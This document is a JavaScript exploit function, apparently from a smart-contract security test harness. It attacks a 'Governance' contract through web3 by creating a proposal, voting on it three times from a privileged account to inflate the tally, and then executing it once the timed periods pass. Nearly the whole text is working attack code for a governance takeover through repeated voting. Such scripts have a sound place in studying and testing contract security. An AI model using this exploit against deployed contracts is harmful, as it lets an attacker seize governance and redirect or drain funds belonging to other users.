async function exploit(web3, envInfo, contractAddress) {
    try {
        // Load the ABI of the Governance contract
        // Assuming you have already compiled and have the ABI
        const { abi } = await compileWithVersion(source, contractFileFullName, 'Governance', solcVersion);
        const contractInstance = new web3.eth.Contract(abi, contractAddress);

        // Step 1: Create a proposal
        console.log("Creating a proposal...");
        let createResult = await contractInstance.methods.createProposal().send({
            from: envInfo.accounts[0],
            gas: 3000000
        });
        const proposalId = 0; // let's always target the first proposal in the list;
        governanceExploitLogger.debug(`Proposal created with ID: ${proposalId}`);

        // Wait for review period to end
        governanceExploitLogger.debug(`Waiting for review period to end: sleeping for 5 seconds!`);
        await sleep(5000);

        // Step 2: Vote on the proposal multiple times with the privileged address
        for (let i = 0; i < 3; i++) {
            console.log(`Voting on proposal ${proposalId}...`);
            await contractInstance.methods.vote(proposalId).send({
                from: envInfo.privilegedAccount, // Use the privileged account address
                gas: 3000000
            });
        }

        // Wait for grace period to finish
        console.log("Waiting for grace period to end...");
        await sleep(5000);

        // Step 3: Execute the proposal
        console.log(`Executing proposal ${proposalId}...`);
        const executeResult = await contractInstance.methods.executeProposal(proposalId).send({
            from: envInfo.accounts[0],
            gas: 3000000
        });
        governanceExploitLogger.info(`Proposal ${proposalId} executed!`);

        return true;
    } catch (error) {
        console.error("Error in governance actions:", error);
        return false;
    }
}
